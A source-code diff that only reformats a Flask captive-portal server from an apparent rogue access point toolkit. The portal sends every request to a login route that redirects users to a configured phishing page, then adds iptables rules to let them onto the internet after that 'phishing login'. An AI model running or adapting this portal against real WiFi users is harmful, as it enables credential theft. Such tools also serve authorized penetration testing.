@@ -18,23 +18,38 @@ config_pk = SettingsINI(C.CONFIG_PK_INI)
 
 def login_user(ip, iptables_binary_path):
     subprocess.call(
-        [iptables_binary_path, "-t", "nat", "-I", "PREROUTING", "1", "-s", ip, "-j", "ACCEPT"]
+        [
+            iptables_binary_path,
+            "-t",
+            "nat",
+            "-I",
+            "PREROUTING",
+            "1",
+            "-s",
+            ip,
+            "-j",
+            "ACCEPT",
+        ]
     )
     subprocess.call([iptables_binary_path, "-I", "FORWARD", "-s", ip, "-j", "ACCEPT"])
 
 
 @app.route("/login", methods=["GET", "POST"])
 def login():
-        global  URL_PHISHINGCLOUD, config
-        sys.stdout.write(
-            f"Login:: User: {request.remote_addr} redirecting to {URL_PHISHINGCLOUD}\n"
-        )
-        sys.stdout.flush()
-        return redirect(URL_PHISHINGCLOUD, code=302)
+    global URL_PHISHINGCLOUD, config
+    sys.stdout.write(
+        f"Login:: User: {request.remote_addr} redirecting to {URL_PHISHINGCLOUD}\n"
+    )
+    sys.stdout.flush()
+    return redirect(URL_PHISHINGCLOUD, code=302)
 
-@app.route("{}".format(config_pk.get("settings", "allow_user_login_endpoint")), methods=["GET", "POST"])
+
+@app.route(
+    "{}".format(config_pk.get("settings", "allow_user_login_endpoint")),
+    methods=["GET", "POST"],
+)
 def verifyUserAfterPhishingLogin():
-    global  URL_PHISHINGCLOUD, config
+    global URL_PHISHINGCLOUD, config
     sys.stdout.write(
         f"Verify:: Allow internet connection for use {request.remote_addr}\n"
     )
@@ -43,7 +58,8 @@ def verifyUserAfterPhishingLogin():
     )
     sys.stdout.flush()
     login_user(request.remote_addr, config.get("iptables", "path_binary"))
-    return redirect(URL_REDIRECT_AFTER_LOGIN, code=302) 
+    return redirect(URL_REDIRECT_AFTER_LOGIN, code=302)
+
 
 @app.route("/favicon.ico")
 def favicon():
@@ -56,8 +72,9 @@ def catch_all(path):
     global REDIRECT, PORT
     if PORT != 80:
         return redirect(
-            "http://{}:{}/login?".format(REDIRECT, PORT) + urlencode({"orig_url": request.url})
-        )        
+            "http://{}:{}/login?".format(REDIRECT, PORT)
+            + urlencode({"orig_url": request.url})
+        )
     return redirect(
         "http://{}/login?".format(REDIRECT) + urlencode({"orig_url": request.url})
     )
@@ -118,7 +135,7 @@ def main():
     URL_PHISHINGCLOUD = args.cloud_url
     URL_REDIRECT_AFTER_LOGIN = args.redirect_url
     PORT = args.port
-    
+
     config = SettingsINI(C.CONFIG_INI)
 
     app.run(REDIRECT, port=args.port)
